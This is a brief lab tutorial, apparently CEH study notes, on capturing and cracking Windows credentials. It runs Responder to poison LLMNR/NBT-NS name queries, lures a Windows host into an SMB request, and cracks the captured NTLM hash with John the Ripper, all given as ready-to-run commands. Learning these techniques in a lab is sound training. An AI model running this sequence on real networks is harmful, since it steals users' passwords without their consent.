# System Hacking

## Gain access to the system

### Crack the systemâ€™s password using Responder

Responder is an LLMNR, NBT-NS, and MDNS poisoner. It responds to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix. By default, the tool only responds to a File Server Service request, which is for SMB.

```
cd Responder
chmod +x Responder.py
./Responder.py -I eth0
```
Goto windows machine
open run
type "\\CEH-Tools"
Go back to the linux machine

The logs are by default stored at ~/logs
```
sudo apt install john-the-ripper
sudo john ~/logs/SMB-NTLM
```
The password is now cracked!
